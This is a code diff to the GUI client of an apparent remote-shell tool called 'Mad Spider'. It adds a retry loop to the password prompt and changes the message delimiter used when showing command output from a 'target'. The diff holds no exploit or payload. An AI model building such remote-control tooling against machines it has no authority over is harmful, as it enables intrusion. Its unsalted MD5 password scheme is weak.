@@ -236,41 +236,44 @@ class MainDialog(QWidget, gui.Ui_Form):
     def connectSocket(self):
 
         # Ask Password
-        dlg = QInputDialog(self)
-        dlg.setInputMode(QInputDialog.TextInput)
-        dlg.setWindowTitle('Password Protection')
-        dlg.setLabelText('Enter Password: ')
-        dlg.setOkButtonText('Login')
-        dlg.setStyleSheet(style.popupDialog)
-        ok = dlg.exec_()
+        while 1:
+            dlg = QInputDialog(self)
+            dlg.setInputMode(QInputDialog.TextInput)
+            dlg.setWindowTitle('Password Protection')
+            dlg.setLabelText('Enter Password: ')
+            dlg.setOkButtonText('Login')
+            dlg.setStyleSheet(style.popupDialog)
+            ok = dlg.exec_()
 
-        if str(dlg.textValue()) != '':
-            _hash = hashlib.md5()
-            _hash.update( str(dlg.textValue()))
-            self.Send(_hash.hexdigest())
+            if str(dlg.textValue()) != '':
+                _hash = hashlib.md5()
+                _hash.update( str(dlg.textValue()))
+                self.Send(_hash.hexdigest())
 
-            try:
-                self.statusok('Recieve activate message from target', self.lineno())
-                # Recieve activate message from target
-                self.data = self.Receive()
+                try:
+                    self.data = self.Receive()
 
-                if self.data != '':
-                    if self.data == 'Access Denied':
-                        self.displayText(header='Access Denied')
-                        self.active = False
-                    else:
-                        self.active = True
-                        self.displayText(msg=self.data.split('XORXORXOR13')[0])
-                        self.setWindowTitle('Mad Spider - Client - Connected to %s' % str(self.sockItems[self.sockind]))
-                        self.statusok('Connected to {}'.format(str(self.sockItems[self.sockind])), self.lineno())
-                        self.tabWidget.setEnabled(True)
-            except socket.error:
-                self.statusno('Error while recieve message from target', self.lineno())
-                self.statusok('Close connection', self.lineno())
-                # Error while recieve message from target
-                self.socks[self.sockind].close()
-                time.sleep(0.8)
-                self.active = False
+                    if self.data != '':
+                        if self.data == 'Access Denied':
+                            self.displayText(header='Access Denied')
+                            self.socks[self.sockind].close()
+                            self.active = False
+                            continue
+                        else:
+                            self.active = True
+                            self.displayText(msg=self.data.split('[ENDOFMESSAGE]')[0])
+                            self.setWindowTitle('Mad Spider - Client - Connected to %s' % str(self.sockItems[self.sockind]))
+                            self.tabWidget.setEnabled(True)
+                            break
+                except socket.error:
+                    self.statusno('Error while recieve message from target', self.lineno())
+                    self.statusok('Close connection', self.lineno())
+                    # Error while recieve message from target
+                    self.socks[self.sockind].close()
+                    time.sleep(0.8)
+                    self.active = False
+                    break
+                break
 
     # while close program, connect himself for shutdown socket
     def closeEvent(self, event):
@@ -600,7 +603,7 @@ class MainDialog(QWidget, gui.Ui_Form):
 
                 self.statusok('Set status output', self.lineno())
                 # Set shell output
-                self.displayText(header=self.commandLine.text(), msg=self.data.split('XORXORXOR13')[0])
+                self.displayText(header=self.commandLine.text(), msg=self.data.split('[ENDOFMESSAGE]')[0])
                 self.commandLine.setText('')
         else:
             self.displayText(msg='run server and click to client for connect', error='Not connected')
